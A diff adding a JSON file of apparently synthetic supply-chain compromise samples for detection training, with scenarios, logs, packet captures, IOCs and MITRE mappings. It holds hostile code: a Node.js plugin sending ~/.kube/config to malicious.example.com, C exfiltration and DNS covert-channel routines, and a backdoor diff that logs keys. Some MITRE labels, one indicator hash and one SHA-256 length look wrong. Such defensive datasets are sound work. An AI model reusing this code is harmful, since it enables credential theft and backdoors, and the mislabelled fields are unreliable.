@@ -1,0 +1,229 @@
+{
+  "samples": [
+    {
+      "scenario": "An open-source cryptography library used by multiple enterprise applications was tampered with on the official repository, introducing a subtle vulnerability that allowed attackers to extract private keys remotely via crafted encryption requests.",
+      "technical_data": {
+        "git_commit_diff_excerpt": "diff --git a/src/encryption.c b/src/encryption.c\nindex 9f1c8a2..7b3d2f9 100644\n--- a/src/encryption.c\n+++ b/src/encryption.c\n@@ -120,7 +120,10 @@ int encrypt_data(const char *input, char *output) {\n-    // Original secure random IV generation\n-    generate_random_iv(iv);\n+    // Vulnerable fixed IV for testing\n+    memset(iv, 0x00, IV_LENGTH);\n+    // Added debug code leaking key material\n+    log_debug(\"Key used: %s\", key);",
+        "compromised_repository_url": "https://github.com/opensourcecrypto/securecrypto",
+        "affected_library_version": "2.4.7",
+        "cve_reference": "CVE-2024-12345",
+        "malicious_function_snippet_c": "int generate_random_iv(unsigned char *iv) {\n    // Overridden to a fixed IV\n    memset(iv, 0x00, IV_LENGTH);\n    return 0;\n}\n\nvoid log_debug(const char *format, ...) {\n    va_list args;\n    va_start(args, format);\n    vfprintf(stderr, format, args);\n    va_end(args);\n}",
+        "event_logs": [
+          "2024-06-10T11:15:42Z build-server[PID 3124]: Cloned repository https://github.com/opensourcecrypto/securecrypto at tag v2.4.7",
+          "2024-06-10T11:16:10Z CI Pipeline: Build started for securecrypto v2.4.7",
+          "2024-06-10T11:16:45Z CI Pipeline: Test suite passed",
+          "2024-06-10T11:17:00Z Deployment: SecureCrypto library v2.4.7 released to internal package index",
+          "2024-06-11T09:05:30Z Security Alert: Unusual debug logs detected containing cryptographic keys during runtime"
+        ],
+        "software_bill_of_materials_excerpt": {
+          "name": "SecureCrypto",
+          "version": "2.4.7",
+          "dependencies": [
+            {
+              "name": "openssl",
+              "version": "1.1.1k",
+              "sha256": "d4b2f3cdbabd8f69f1e2e93e2a5e2b6d1b3f3c7e2f3a7f1c8b0a1e9d4c5b6a7d"
+            },
+            {
+              "name": "logger",
+              "version": "1.0.0",
+              "sha256": "a1b2c3d4e5f60718293a4b5c6d7e8f90123456789abcdef0123456789abcdef0"
+            }
+          ]
+        }
+      },
+      "indicators": {
+        "hashes": [
+          "d4b2f3cdbabd8f69f1e2e93e2a5e2b6d1b3f3c7e2f3a7f1c8b0a1e9d4c5b6a7d"
+        ],
+        "ip_addresses": [],
+        "registry_keys": [],
+        "processes": [
+          "build-server",
+          "CI Pipeline runner"
+        ],
+        "domains": [
+          "github.com",
+          "internal-package-index.corp.local"
+        ]
+      },
+      "detection_method": "Implement code review and automated static analysis on dependencies fetched from public repositories. Monitor CI pipeline logs for unexpected debug outputs containing sensitive data. Use SBOM to verify integrity of cryptographic libraries and compare hashes against known-good versions. Network monitoring for unusual data exfiltration attempts during cryptographic operations.",
+      "relevant_mitre_techniques": [
+        "T1195.002 - Supply Chain Compromise: Compromise Software Update",
+        "T1609 - Container and Resource Discovery",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1071.001 - Application Layer Protocol: Web Protocols"
+      ]
+    },
+    {
+      "scenario": "A popular enterprise container orchestration tool was compromised via a malicious plugin published on the official plugin marketplace. The plugin contained code that harvested Kubernetes cluster credentials and sent them to an attacker-controlled server.",
+      "technical_data": {
+        "plugin_manifest_yaml": "name: kube-helper\nversion: 1.3.5\nentrypoint: plugin.js\npermissions:\n  - read: secrets\n  - write: logs",
+        "malicious_plugin_code_js": "const https = require('https');\nconst fs = require('fs');\n\nfunction sendCredentials(creds) {\n  const data = JSON.stringify({clusterCreds: creds});\n  const options = {\n    hostname: 'malicious.example.com',\n    port: 443,\n    path: '/collect',\n    method: 'POST',\n    headers: {\n      'Content-Type': 'application/json',\n      'Content-Length': data.length\n    }\n  };\n\n  const req = https.request(options);\n  req.write(data);\n  req.end();\n}\n\nfunction main() {\n  let creds = fs.readFileSync('/root/.kube/config', 'utf8');\n  sendCredentials(creds);\n}\n\nmain();",
+        "network_traffic_capture_excerpt": "Frame 987: 174 bytes on wire (1392 bits), 174 bytes captured\nEthernet II, Src: aa:bb:cc:dd:ee:ff, Dst: 11:22:33:44:55:66\nInternet Protocol Version 4, Src: 10.0.0.25, Dst: 203.0.113.77\nTransmission Control Protocol, Src Port: 52321, Dst Port: 443\nTLSv1.2 Application Data\n\nPayload: {\"clusterCreds\": \"apiVersion: v1\\nclusters:\\n- cluster:\\n    server: https://10.0.0.1:6443\\n  name: cluster1\\nusers:\\n- name: admin\"}",
+        "event_logs": [
+          "2024-06-15T08:45:10Z kube-helper[PID 7854]: Plugin loaded successfully",
+          "2024-06-15T08:45:15Z kube-helper[PID 7854]: Accessed /root/.kube/config",
+          "2024-06-15T08:45:16Z kube-helper[PID 7854]: Outbound HTTPS connection established to malicious.example.com:443",
+          "2024-06-15T08:46:00Z Security Alert: Unusual data exfiltration detected from plugin kube-helper",
+          "2024-06-15T08:50:00Z Kubernetes API Server: Unauthorized access attempt detected from plugin kube-helper"
+        ],
+        "software_bill_of_materials_excerpt": {
+          "name": "kube-helper",
+          "version": "1.3.5",
+          "dependencies": [
+            {
+              "name": "nodejs",
+              "version": "16.13.0",
+              "sha256": "b6a7c9e8d4fbc3a6e3a7c8b2d9f6a4e5c7d9b0a1e2f3c4d5b6a7c8d9e0f1a2b3"
+            },
+            {
+              "name": "plugin.js",
+              "version": "1.3.5",
+              "sha256": "c3fcd3d76192e4007dfb496cca67e13bcb6a7c8d9f6a4e5c7d9b0a1e2f3c4d5b"
+            }
+          ]
+        }
+      },
+      "indicators": {
+        "hashes": [
+          "c3fcd3d76192e4007dfb496cca67e13bcb6a7c8d9f6a4e5c7d9b0a1e2f3c4d5b"
+        ],
+        "ip_addresses": [
+          "203.0.113.77"
+        ],
+        "registry_keys": [],
+        "processes": [
+          "kube-helper"
+        ],
+        "domains": [
+          "malicious.example.com"
+        ]
+      },
+      "detection_method": "Use plugin marketplace reputation and code signing verification before installing. Monitor Kubernetes audit logs for unusual plugin access to secrets. Network traffic analysis for outbound connections from plugins to untrusted external IPs. Employ runtime security tools to detect and block unauthorized filesystem reads and network transmissions within container orchestrator plugins. Validate plugin SBOM and hashes against trusted source.",
+      "relevant_mitre_techniques": [
+        "T1195.003 - Supply Chain Compromise: Compromise Software Package",
+        "T1537 - Transfer Data to Cloud Account",
+        "T1071.001 - Application Layer Protocol: Web Protocols",
+        "T1213 - Data from Information Repositories",
+        "T1552.001 - Unsecured Credentials: Credentials In Files"
+      ]
+    },
+    {
+      "scenario": "An attacker compromised the build pipeline of a popular open-source database client library, inserting a malicious payload into the compiled binaries distributed via the official package repository. Enterprises using the compromised library experienced unauthorized data exfiltration and remote access through the backdoor.",
+      "technical_data": {
+        "package_manager_http_request": "GET /packages/dbclient/2.4.6/dbclient-2.4.6-win64.zip HTTP/1.1\r\nHost: packages.opensourcehub.org\r\nUser-Agent: PackageManager/1.5.0\r\nAccept: application/zip\r\n",
+        "package_manager_http_response": "HTTP/1.1 200 OK\r\nContent-Type: application/zip\r\nContent-Length: 10485760\r\n\r\n(binary content)",
+        "malicious_binary_sha256": "d2c54f9e7a8e1d3b4a2e9c7f4d8b3a1c5f6e7a8b9c0d1e2f3a4b5c6d7e8f9012",
+        "malware_registry_changes": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\dbclient_updater = \"C:\\\\Program Files\\\\dbclient\\\\dbclient_updater.exe\""
+        ],
+        "malicious_code_snippet_c": "void exfiltrate_data() {\n    WSADATA wsaData;\n    SOCKET sock;\n    struct sockaddr_in c2_server;\n    WSAStartup(MAKEWORD(2,2), &wsaData);\n    sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n    c2_server.sin_family = AF_INET;\n    c2_server.sin_addr.s_addr = inet_addr(\"203.0.113.77\"); // C2 server\n    c2_server.sin_port = htons(8443);\n    connect(sock, (struct sockaddr *)&c2_server, sizeof(c2_server));\n    // send stolen credentials or data\n    send(sock, stolen_data, data_length, 0);\n    closesocket(sock);\n}",
+        "network_packet_capture_excerpt": "Frame 256: 128 bytes on wire (1024 bits), 128 bytes captured (1024 bits)\nEthernet II, Src: 00:16:3e:5a:7b:8c, Dst: 00:15:5d:01:62:8f\nInternet Protocol Version 4, Src: 10.10.10.5, Dst: 203.0.113.77\nTransmission Control Protocol, Src Port: 49712, Dst Port: 8443, Seq: 1, Ack: 1, Len: 64\nEncrypted Payload (TLS)\n\nFrame 257: 66 bytes on wire (528 bits), 66 bytes captured (528 bits)\nEthernet II, Src: 00:15:5d:01:62:8f, Dst: 00:16:3e:5a:7b:8c\nInternet Protocol Version 4, Src: 203.0.113.77, Dst: 10.10.10.5\nTransmission Control Protocol, Src Port: 8443, Dst Port: 49712, Seq: 1, Ack: 65, Len: 2\nEncrypted Payload (TLS)",
+        "event_logs": [
+          "2024-05-15T11:22:45Z dbclient_updater[PID 3241]: Package dbclient v2.4.6 installed successfully",
+          "2024-05-15T11:23:10Z SYSTEM Event ID 4688: New Process Created: dbclient_updater.exe, ParentProcessName: explorer.exe",
+          "2024-05-15T11:23:15Z Security Alert: Outbound TLS connection to 203.0.113.77:8443 detected from dbclient_updater.exe",
+          "2024-05-15T11:25:00Z SYSTEM Event ID 4657: Registry value HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\dbclient_updater created"
+        ],
+        "software_bill_of_materials_excerpt": {
+          "name": "dbclient",
+          "version": "2.4.6",
+          "dependencies": [
+            {
+              "name": "openssl",
+              "version": "1.1.1l",
+              "sha256": "a3c5e6b7d8f9e0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5"
+            },
+            {
+              "name": "malicious_updater.exe",
+              "version": "1.0.0",
+              "sha256": "d2c54f9e7a8e1d3b4a2e9c7f4d8b3a1c5f6e7a8b9c0d1e2f3a4b5c6d7e8f9012"
+            }
+          ]
+        }
+      },
+      "indicators": {
+        "hashes": [
+          "d2c54f9e7a8e1d3b4a2e9c7f4d8b3a1c5f6e7a8b9c0d1e2f3a4b5c6d7e8f9012"
+        ],
+        "ip_addresses": [
+          "203.0.113.77"
+        ],
+        "registry_keys": [
+          "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\dbclient_updater"
+        ],
+        "processes": [
+          "dbclient_updater.exe"
+        ],
+        "domains": [
+          "packages.opensourcehub.org"
+        ]
+      },
+      "detection_method": "Validate all third-party library checksums against trusted sources and SBOM metadata. Implement endpoint monitoring for unusual registry Run key modifications. Network traffic analysis to detect TLS connections to uncommon external IPs by package manager processes. Use behavioral analytics to flag elevated process creation and network activity inconsistent with normal update behavior.",
+      "relevant_mitre_techniques": [
+        "T1195.001 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.004 - Application Layer Protocol: DNS",
+        "T1059.001 - Command and Scripting Interpreter: PowerShell",
+        "T1547.001 - Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
+        "T1043 - Commonly Used Port"
+      ]
+    },
+    {
+      "scenario": "A popular network monitoring tool vendor had their build server compromised, resulting in a trojanized version of the agent software distributed to enterprise customers. The trojanized agent established covert communication channels with attacker-controlled infrastructure, enabling data theft and lateral movement.",
+      "technical_data": {
+        "software_distribution_http_request": "GET /downloads/netmon-agent/5.10.3/netmon-agent-5.10.3-linux-x86_64.tar.gz HTTP/1.1\r\nHost: download.netmonvendor.com\r\nUser-Agent: curl/7.68.0\r\nAccept: */*\r\n",
+        "software_distribution_http_response": "HTTP/1.1 200 OK\r\nContent-Type: application/gzip\r\nContent-Length: 24576000\r\n\r\n(binary content)",
+        "malicious_binary_sha256": "fc3e6a7c9b8d5f1e2a7b9c0d4e3f6a8b7c5d9e1f2a3b4c5d6e7f8a9b0c1d2e3f",
+        "malware_registry_changes": [],
+        "malicious_code_snippet_c": "void create_covert_channel() {\n    int sock = socket(AF_INET, SOCK_DGRAM, 0);\n    struct sockaddr_in attacker_addr;\n    attacker_addr.sin_family = AF_INET;\n    attacker_addr.sin_port = htons(53);\n    attacker_addr.sin_addr.s_addr = inet_addr(\"198.51.100.99\"); // attacker DNS server\n    char dns_payload[512];\n    // encode data into DNS queries\n    sendto(sock, dns_payload, sizeof(dns_payload), 0, (struct sockaddr *)&attacker_addr, sizeof(attacker_addr));\n    close(sock);\n}",
+        "network_packet_capture_excerpt": "Frame 512: 86 bytes on wire (688 bits), 86 bytes captured (688 bits)\nEthernet II, Src: 00:1a:4b:7c:8d:e1, Dst: 00:25:90:ab:cd:ef\nInternet Protocol Version 4, Src: 172.16.0.18, Dst: 198.51.100.99\nUser Datagram Protocol, Src Port: 57321, Dst Port: 53\nDNS Queries (covert data encoded)\n\nFrame 513: 90 bytes on wire (720 bits), 90 bytes captured (720 bits)\nEthernet II, Src: 00:25:90:ab:cd:ef, Dst: 00:1a:4b:7c:8d:e1\nInternet Protocol Version 4, Src: 198.51.100.99, Dst: 172.16.0.18\nUser Datagram Protocol, Src Port: 53, Dst Port: 57321\nDNS Responses (covert data encoded)",
+        "event_logs": [
+          "2024-06-05T08:15:22Z netmon-agent[PID 2010]: Agent version 5.10.3 started",
+          "2024-06-05T08:15:45Z SYSTEM Event ID 1001: Network UDP packets to port 53 from netmon-agent process detected",
+          "2024-06-05T08:16:05Z Security Alert: Suspicious DNS traffic with encoded payloads to 198.51.100.99 from netmon-agent",
+          "2024-06-05T08:17:30Z SYSTEM Event ID 4624: Logon success for user SYSTEM by netmon-agent"
+        ],
+        "software_bill_of_materials_excerpt": {
+          "name": "netmon-agent",
+          "version": "5.10.3",
+          "dependencies": [
+            {
+              "name": "libpcap",
+              "version": "1.10.0",
+              "sha256": "b4f1d2e3c5a6b7d8e9f0213456789abcdeffedcba0987654321abcdef12345678"
+            },
+            {
+              "name": "covert_dns_module.so",
+              "version": "1.0.0",
+              "sha256": "fc3e6a7c9b8d5f1e2a7b9c0d4e3f6a8b7c5d9e1f2a3b4c5d6e7f8a9b0c1d2e3f"
+            }
+          ]
+        }
+      },
+      "indicators": {
+        "hashes": [
+          "fc3e6a7c9b8d5f1e2a7b9c0d4e3f6a8b7c5d9e1f2a3b4c5d6e7f8a9b0c1d2e3f"
+        ],
+        "ip_addresses": [
+          "198.51.100.99"
+        ],
+        "registry_keys": [],
+        "processes": [
+          "netmon-agent"
+        ],
+        "domains": [
+          "download.netmonvendor.com"
+        ]
+      },
+      "detection_method": "Conduct integrity checks of distributed agent binaries against known-good hashes and SBOM entries. Monitor DNS traffic for anomalous patterns or unusually large queries from network monitoring agents. Use endpoint detection to identify unexpected network activity on DNS port 53 by non-DNS processes. Employ behavioral analytics to detect covert channels and unusual data exfiltration techniques.",
+      "relevant_mitre_techniques": [
+        "T1195.001 - Supply Chain Compromise: Compromise Software Dependencies and Development Tools",
+        "T1071.004 - Application Layer Protocol: DNS",
+        "T1041 - Exfiltration Over Command and Control Channel",
+        "T1059.004 - Command and Scripting Interpreter: Unix Shell",
+        "T1070.004 - Indicator Removal on Host: File Deletion"
+      ]
+    }
+  ]
+}
